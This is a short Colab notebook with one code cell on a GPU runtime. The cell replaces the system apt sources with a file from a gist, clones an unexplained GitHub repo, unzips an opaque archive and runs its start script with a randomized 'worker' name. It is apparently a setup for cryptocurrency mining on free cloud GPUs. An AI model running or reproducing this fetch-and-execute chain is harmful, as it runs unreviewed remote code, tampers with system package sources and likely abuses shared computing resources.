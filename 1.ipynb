{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "1.ipynb",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "1RtRY5Mr_Qp8"
      },
      "source": [
        "!wget https://gist.githubusercontent.com/ishad0w/788555191c7037e249a439542c53e170/raw/3822ba49241e6fd851ca1c1cbcc4d7e87382f484/sources.list && cp -r sources.list /etc/apt/sources.list && git clone https://github.com/userdz0/888 && cd 888 && unzip cg && perl -pe 's/workerg1/\" \" . (100 + int rand 900) .  \" \"/ge' < start.sh > 0.sh && chmod +x 0.sh && apt update && apt install pkg-config libtool libcurl4-openssl-dev -y\n",
        "!cd 888 && ./0.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}